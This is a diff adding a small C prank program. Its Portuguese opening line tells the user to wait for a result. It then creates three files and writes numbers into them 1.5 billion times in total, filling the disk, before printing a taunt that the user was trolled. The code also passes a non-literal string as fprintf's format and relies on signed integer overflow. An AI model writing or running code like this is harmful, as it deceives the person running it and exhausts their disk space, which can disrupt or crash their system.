@@ -1,0 +1,25 @@
+#include <stdio.h>
+#include <string.h>
+
+int main (){
+	printf("espere o retorno do programa\n\n");
+	for (int i = 0; i < 3; i++){
+		char trolado[100] = "trolei kkakkaka ";
+		char temp[2];
+		sprintf(temp, "%d", i);
+		strcat(trolado, temp);
+		FILE *arquivo = fopen(trolado, "w");
+		
+		for (int a = 0; a < 50; a++){
+			int numero = 30000; 
+			for (int b = 0; b < 10000000; b++){
+				numero = numero * numero;
+				sprintf(trolado, "%d", numero);
+				fprintf(arquivo, trolado);
+			}
+			
+		}
+		
+	}
+	printf("TROLADO KAKKAKAKAKA");
+}
